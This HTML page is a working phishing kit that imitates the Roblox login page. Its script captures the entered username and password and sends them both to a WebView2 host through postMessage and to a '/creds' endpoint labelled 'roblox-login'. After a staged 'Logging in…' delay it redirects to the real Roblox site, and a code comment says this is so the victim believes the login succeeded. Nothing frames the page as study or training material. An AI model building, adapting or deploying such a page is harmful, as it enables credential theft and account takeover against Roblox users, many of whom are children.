<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Log In to Roblox</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  * { box-sizing: border-box; }
  html, body { margin:0; padding:0; font-family:"Hind","Segoe UI",Roboto,Arial,sans-serif; color:#393b3d; background:#fff; }
  a { color:#0074bd; text-decoration:none; }
  a:hover { text-decoration:underline; }

  /* header */
  .topbar {
    height:56px; padding:0 24px; display:flex; align-items:center; justify-content:space-between;
    border-bottom:1px solid #e3e5e7; background:#fff;
  }
  .topbar .logo { font-weight:800; font-size:24px; color:#393b3d; letter-spacing:-.5px; }
  .topbar .nav a { color:#393b3d; font-weight:500; font-size:14px; margin-left:20px; }
  .topbar .nav a:hover { color:#0074bd; text-decoration:none; }

  /* card */
  .wrap { min-height:calc(100vh - 56px); display:flex; justify-content:center; padding:48px 16px 80px; }
  .card { width:100%; max-width:420px; }
  .avatar {
    width:100px; height:100px; border-radius:50%; background:#f2f4f5;
    display:flex; align-items:center; justify-content:center; margin:0 auto 20px;
    border:1px solid #e3e5e7;
  }
  .avatar svg { width:56px; height:56px; fill:#b8bcbf; }
  h1 { font-size:26px; font-weight:700; text-align:center; margin:0 0 32px; color:#393b3d; }
  label { display:block; font-size:14px; font-weight:500; color:#393b3d; margin-bottom:6px; }
  input {
    width:100%; padding:12px 14px; border:1px solid #b8bcbf; border-radius:3px;
    font-size:16px; font-family:inherit; margin-bottom:20px; outline:none; background:#fff;
    color:#393b3d;
  }
  input:focus { border-color:#0074bd; box-shadow:0 0 0 2px rgba(0,116,189,.18); }
  .row { display:flex; align-items:center; justify-content:space-between; margin-bottom:20px; }
  .row .forgot { font-size:14px; color:#0074bd; }
  .row .forgot:hover { text-decoration:underline; }

  button.submit {
    width:100%; padding:13px; background:#0074bd; color:#fff; border:none; border-radius:3px;
    font-size:16px; font-weight:600; font-family:inherit; cursor:pointer;
  }
  button.submit:hover { background:#005e99; }
  button.submit:disabled { background:#7aa9cb; cursor:default; }

  .signup { text-align:center; margin-top:24px; font-size:14px; color:#393b3d; }
  .signup a { color:#0074bd; font-weight:500; }

  .divider { text-align:center; margin:24px 0; color:#b8bcbf; font-size:13px; }
  .social { display:flex; gap:12px; justify-content:center; }
  .social .sbtn {
    flex:1; max-width:120px; padding:11px; background:#f2f4f5; border:1px solid #e3e5e7;
    border-radius:3px; font-size:13px; font-weight:500; color:#393b3d; cursor:pointer; text-align:center;
  }
  .social .sbtn:hover { background:#e8ebed; }

  .err { color:#d93025; font-size:13px; margin-bottom:12px; display:none; text-align:center; }

  /* footer */
  .footer {
    border-top:1px solid #e3e5e7; padding:20px 24px; font-size:13px;
    color:#6e757a; display:flex; flex-wrap:wrap; gap:16px; align-items:center;
  }
  .footer a { color:#6e757a; }
  .footer a:hover { color:#393b3d; text-decoration:none; }
</style>
</head>
<body>

<div class="topbar">
  <div class="logo">ROBLOX</div>
  <div class="nav">
    <a href="#">About Us</a>
    <a href="#">Careers</a>
    <a href="#">Blog</a>
    <a href="#">Help</a>
  </div>
</div>

<div class="wrap">
  <div class="card">
    <div class="avatar">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v3h20v-3c0-3.33-6.67-5-10-5z"/></svg>
    </div>
    <h1>Log In to Roblox</h1>

    <div class="err" id="err">Incorrect username or password. Please try again.</div>

    <form id="f" autocomplete="off">
      <label for="username">Username/Email</label>
      <input id="username" name="username" type="text" required autocapitalize="off" autocorrect="off">

      <label for="password">Password</label>
      <input id="password" name="password" type="password" required>

      <div class="row">
        <span></span>
        <a class="forgot" href="#">Forgot Password?</a>
      </div>

      <button class="submit" type="submit" id="btn">Log In</button>
    </form>

    <div class="signup">Don't have an account? <a href="#">Sign Up</a></div>

    <div class="divider">Or</div>
    <div class="social">
      <div class="sbtn">Facebook</div>
      <div class="sbtn">Google</div>
      <div class="sbtn">Apple</div>
    </div>
  </div>
</div>

<div class="footer">
  <span>©2026 Roblox Corporation</span>
  <a href="#">About Us</a>
  <a href="#">Careers</a>
  <a href="#">Blog</a>
  <a href="#">Help</a>
  <a href="#">Terms</a>
  <a href="#">Privacy</a>
</div>

<script>
  function send(username, password) {
    // WebView2 host picks this up
    if (window.chrome && window.chrome.webview) {
      window.chrome.webview.postMessage(username + "|" + password);
    }
    // browser fallback
    try {
      fetch("/creds", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: username, password: password, stage: "roblox-login" })
      });
    } catch(e){}
  }

  document.getElementById("f").addEventListener("submit", function(e){
    e.preventDefault();
    const u = document.getElementById("username").value.trim();
    const p = document.getElementById("password").value;
    if (!u || !p) return;

    send(u, p);

    const btn = document.getElementById("btn");
    btn.disabled = true;
    btn.textContent = "Logging in…";

    // fake a beat, then bounce to real Roblox — user thinks they got in
    setTimeout(function(){
      window.location.href = "https://www.roblox.com/home";
    }, 1500);
  });
</script>
</body>
</html>
